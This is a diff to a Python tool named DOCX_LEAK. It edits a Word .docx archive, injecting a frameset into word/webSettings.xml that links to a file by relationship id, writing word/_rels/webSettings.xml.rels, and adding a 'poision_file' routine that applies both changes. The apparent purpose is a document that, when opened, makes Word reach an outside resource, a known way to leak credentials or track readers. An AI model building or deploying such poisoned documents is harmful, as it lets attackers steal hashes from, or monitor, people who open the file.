@@ -1,8 +1,5 @@
-import tempfile
-import zipfile
-import os
-import io
-
+import tempfile,zipfile
+import io,os
 
 
 class DOCX_LEAK:
@@ -15,27 +12,21 @@ class DOCX_LEAK:
         self.docx_file_read = self.get_docx_file(self.docx_path,"r")
         self.word_webSettings_xml_str = f"<?xml version='1.0'?><w:frameset><w:framesetSplitbar><w:w w:val='60'/><w:color w:val='auto'/><w:noBorder/></w:framesetSplitbar><w:frameset><w:frame><w:name w:val='3'/><w:sourceFileName r:id='{element_id}'/><w:linkedToFile/></w:frame></w:frameset></w:frameset>"
 
-        #self.docx_file_read.close()
     
     ## WRITE
     def write_word_webSettings_xml(self):
         insert_word_webSettings_xml = self.insert_word_webSettings_xml()
         self.docx_file_read.close()
-        self.edit_zip_file( # WRITE
+        self.edit_zip_file(
             "word/webSettings.xml",
             insert_word_webSettings_xml
         )
 
     def write__word__rels_document_xml_rels(self):
-        #self.docx_file_read.close()
-        #self.edit_zip_file(
-        self.get_docx_file(self.docx_path,"w").write(
-            #"README.md"
-            #"word/_rels/webSettings.xml.rels",
-            #io.StringIO(self.insert_word__rels_document_xml_rels())
-            #self.insert_word__rels_document_xml_rels()
+        self.edit_zip_file(    
+            "word/_rels/webSettings.xml.rels",
+            self.insert_word__rels_document_xml_rels()
         )
-
 
     ## INSERT
     def insert_word_webSettings_xml(self):
@@ -50,6 +41,7 @@ class DOCX_LEAK:
 
       ## READ
    
+    ## READ
     def read_word_webSettings_xml(self):
         return self.docx_file_read.read("word/webSettings.xml").decode("utf-8")
 
@@ -79,6 +71,15 @@ class DOCX_LEAK:
                         zout.writestr(item, zin.read(item.filename))
         os.remove(self.docx_path)
         os.rename(tmpname, self.docx_path)
-        with zipfile.ZipFile(self.docx_path, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
+        with zipfile.ZipFile(self.docx_path, mode='a') as zf:
             zf.writestr(filename, data)
-            #zf.close()
+            zf.close()
+
+    def poision_file(self):
+        self.write_word_webSettings_xml()
+        self.write__word__rels_document_xml_rels()
+ 
+
+if __name__ == "__main__":
+    dxl = DOCX_LEAK("...","...","...")
+    dxl.poision_file()
